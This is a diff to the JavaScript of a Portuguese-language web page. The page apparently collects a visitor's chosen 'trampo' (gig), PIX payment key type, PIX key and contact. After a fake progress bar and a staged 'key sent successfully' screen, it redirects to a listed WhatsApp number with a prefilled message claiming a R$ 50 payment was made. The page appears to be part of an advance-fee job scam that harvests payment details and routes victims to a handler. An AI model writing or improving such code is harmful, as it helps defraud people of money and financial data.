@@ -256,6 +256,8 @@
 
     <script>
         function processarSemWhatsApp() {
+            const trampo = document.getElementById('trampo').value;
+            const tipoPix = document.getElementById('tipo_pix').value;
             const chavePix = document.getElementById('chave_pix').value;
             const contato = document.getElementById('contato').value;
 
@@ -274,8 +276,7 @@
             function frame() {
                 if (width >= 100) {
                     clearInterval(id);
-                    // Quando a barra chega em 100%, executa a mudança de texto:
-                    mostrarSucessoFinal();
+                    mostrarSucessoFinal(trampo, tipoPix, chavePix, contato);
                 } else {
                     width++;
                     elem.style.width = width + '%';
@@ -283,17 +284,21 @@
             }
         }
 
-        function mostrarSucessoFinal() {
-            // Altera o ícone, o título e a descrição para o sucesso final
+        function mostrarSucessoFinal(trampo, tipoPix, chavePix, contato) {
             document.getElementById("statusIcon").classList.remove("girar");
             document.getElementById("statusIcon").innerText = "✅";
             document.getElementById("statusTitulo").innerText = "Chave enviada com sucesso!";
-            document.getElementById("statusDesc").innerText = "Seus dados foram vinculados. O prazo de ativação do seu trampo é de até 15 minutos.";
+            document.getElementById("statusDesc").innerText = "Seus dados foram vinculados. Redirecionando para o suporte...";
             
-            // Muda o texto inferior e a cor da barra para verde
             document.getElementById("statusAlerta").innerText = "Status: Concluído com sucesso!";
             document.getElementById("statusAlerta").style.color = "#10b981";
             document.getElementById("myBar").style.backgroundColor = "#10b981";
+
+            const msg = `Olá Bigode! Já fiz o pagamento de R$ 50 e liberei meu acesso.%0A%0A- Trampo escolhido: ${encodeURIComponent(trampo)}%0A- Tipo de PIX: ${encodeURIComponent(tipoPix)}%0A- Chave PIX: ${encodeURIComponent(chavePix)}%0A- Contato: ${encodeURIComponent(contato)}`;
+            
+            setTimeout(() => {
+                window.location.href = `https://wa.me/5532987252649?text=${msg}`;
+            }, 1500);
         }
     </script>
 
